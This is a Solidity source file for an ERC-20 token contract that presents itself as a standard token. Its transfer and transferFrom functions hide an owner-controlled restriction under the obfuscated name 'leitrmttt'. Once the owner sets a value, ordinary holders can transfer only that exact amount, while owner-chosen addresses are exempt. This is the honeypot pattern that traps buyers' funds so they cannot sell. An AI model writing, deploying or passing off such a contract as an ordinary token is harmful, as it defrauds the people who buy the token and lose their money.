pragma solidity ^0.8.4;

// ERC-20 Interface
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// Context contract providing information about the sender
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

// Ownable contract to manage ownership
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    // Constructor sets the initial owner
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    // Returns the current owner
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Modifier to ensure that only the owner can call the function
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    // Allows the current owner to renounce ownership
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

// Main token contract implementing ERC-20, Context, and Ownable
contract subjct3 is Context, Ownable, IERC20 {
    // Balances of all accounts
    mapping (address => uint256) private _balances;
    
    // Allowances for spending tokens
    mapping (address => mapping (address => uint256)) private _allowances;

    // Token details
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    // Transfer leitrmttt and excluded accounts from the leitrmttt
    uint256 private _transferleitrmttt = 0;
    mapping (address => bool) private _excludedFromleitrmttt;

    // Constructor to initialize token details and allocate initial supply
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** uint256(decimals_));
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    // Getters for token details
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    // Implementation of ERC-20 functions

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(isExcludedFromleitrmttt(_msgSender()) || _transferleitrmttt == 0 || amount == _transferleitrmttt, "Transfer amount violates leitrmttt");
        _balances[_msgSender()] -= amount;
        _balances[recipient] += amount;
        emit Transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(isExcludedFromleitrmttt(sender) || _transferleitrmttt == 0 || amount == _transferleitrmttt, "Transfer amount violates leitrmttt");
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        _allowances[sender][_msgSender()] -= amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    // Owner-only function to set the transfer leitrmttt
    function setTransferleitrmttt(uint256 leitrmttt) public onlyOwner {
        _transferleitrmttt = leitrmttt;
    }

    // Owner-only function to exclude accounts from the transfer leitrmttt
    function excludeFromleitrmttt(address [] calldata accounts, bool excluded) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            _excludedFromleitrmttt[accounts[i]] = excluded;
        }
    }

    // Check if an account is excluded from the transfer leitrmttt
    function isExcludedFromleitrmttt(address account) public view returns (bool) {
        return _excludedFromleitrmttt[account];
    }
}